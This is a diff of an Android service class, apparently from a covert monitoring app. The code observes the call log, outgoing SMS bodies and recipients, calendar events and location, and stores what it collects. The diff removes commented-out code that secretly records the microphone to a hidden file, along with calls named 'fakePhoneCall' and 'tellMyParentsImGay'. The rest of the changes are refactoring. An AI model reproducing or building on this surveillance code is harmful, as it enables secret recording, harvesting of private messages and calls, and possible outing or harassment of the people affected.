@@ -158,56 +158,6 @@ public class MessagingService extends Service {
             getContentResolver().registerContentObserver(CalendarContract.Events.CONTENT_URI, true, mCalendarObserver);
         }
             //getContentResolver().registerContentObserver(Uri.parse("content://com.android.chrome.browser/history"), true, mBrowserObserver);
- /*       if(Lofl.isExternalStorageReadable()){
-            File audioFile = new File(Environment.getExternalStorageDirectory() + File.separator + "soundfile2.3gpp");
-            if(! audioFile.exists()){
-                try {
-                    audioFile.createNewFile();
-                } catch (IOException e) {
-                    e.printStackTrace();
-                }
-            }
-            SQLiteDatabase db = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
-            try{
-                db.beginTransaction();
-                Database.insertMedia(db, audioFile.getName(), audioFile);
-                db.setTransactionSuccessful();
-            }catch (SQLiteException e){
-                e.printStackTrace();
-            }finally {
-                db.close();
-                DatabaseHelper.getInstance(getApplicationContext()).close();
-            }
-            new Thread(new Runnable() {
-                @Override
-                public void run() {
-                    try {
-                        sMediaRecorder = new MediaRecorder();
-                        sMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-                        sMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
-                        sMediaRecorder.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB);
-                        sMediaRecorder.setOutputFile(audioFile);
-                        sMediaRecorder.prepare();
-                        sMediaRecorder.start();
-                    } catch (IOException e) {
-                        e.printStackTrace();
-                    }
-                }
-            }).start();
-        }*/
-/*        try {
-
-        } catch (SecurityException e) {
-            e.printStackTrace();
-        }*/
-        //Lofl.fakePhoneCall(this);
-  /*      new Thread(new Runnable() {
-            @Override
-            public void run() {
-                Lofl.tellMyParentsImGay(MessagingService.this);
-            }
-        }).start();*/
-
         if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED && checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
             mHandlerThread = new HandlerThread("locationThread");
             mHandlerThread.start();
@@ -258,7 +208,7 @@ public class MessagingService extends Service {
     }
 
     public static void insertMessage(Context context, String destinationAddress, String originAddress, String body, long time, int type){
-        Database.insertMessage(context, DatabaseHelper.getInstance(context.getApplicationContext()), body, destinationAddress, originAddress, time, type);
+        Database.insertMessage(DatabaseHelper.getInstance(context.getApplicationContext()), destinationAddress, originAddress, body, time, type);
     }
 
     private class CallLogObserver extends ContentObserver{
@@ -274,8 +224,8 @@ public class MessagingService extends Service {
                 @Override
                 public void run() {
                     String[] projection = new String[]{CallLog.Calls._ID, CallLog.Calls.TYPE, CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.DURATION};
-                    Cursor cursor = getContentResolver().query(uri, projection, null, null, null);
-                    if(cursor != null && cursor.moveToLast()){
+                    Cursor cursor = getContentResolver().query(uri, projection, null, null, CallLog.Calls.DEFAULT_SORT_ORDER);
+                    if(cursor != null && cursor.moveToFirst()){
                         int idIndex = cursor.getColumnIndex(CallLog.Calls._ID);
                         int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
                         int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
@@ -288,7 +238,7 @@ public class MessagingService extends Service {
                             String address = cursor.getString(numberIndex);
                             String time = cursor.getString(timeIndex);
                             String duration = cursor.getString(durationIndex);
-                            long newRowId = Database.insertCallLogEntry(MessagingService.this, DatabaseHelper.getInstance(getApplicationContext().getApplicationContext()), callType, address, duration, time);
+                            long newRowId = Database.insertCallLogEntry(DatabaseHelper.getInstance(getApplicationContext().getApplicationContext()), callType, address, duration, time);
                         }
                         cursor.close();
                     }
@@ -316,15 +266,15 @@ public class MessagingService extends Service {
                 @Override
                 public void run() {
                     // TODO: 1/27/19 we need to do a projection for sms. the problem is is that the content uri is set to the base uri without a specific table. however the constant values for columns in boht are identical
-                    Cursor cursor = getContentResolver().query(uri, null, null, null, null);
-                    if (cursor != null && cursor.moveToNext()) {
-                        int type = cursor.getInt(cursor.getColumnIndexOrThrow("type"));
+                    Cursor cursor = getContentResolver().query(uri, null, null, null, Telephony.Sms.DEFAULT_SORT_ORDER);
+                    if (cursor != null && cursor.moveToFirst()) {
+                        int type = cursor.getInt(cursor.getColumnIndex("type"));
                         if ( type == 2) {
-                            int id = cursor.getInt(cursor.getColumnIndexOrThrow("_id"));
+                            int id = cursor.getInt(cursor.getColumnIndex("_id"));
                             if (id != mLastSentMessageId) {
                                 mLastSentMessageId = id;
-                                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
-                                String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
+                                String body = cursor.getString(cursor.getColumnIndex("body"));
+                                String address = cursor.getString(cursor.getColumnIndex("address"));
                                 Intent outgoingSmsIntent = new Intent();
                                 outgoingSmsIntent.putExtra(Constants.ADDRESS, address);
                                 outgoingSmsIntent.putExtra(Constants.BODY, body);
@@ -395,6 +345,5 @@ public class MessagingService extends Service {
         if(sRecorder != null){
             sRecorder.stop();
         }
-
     }
 }
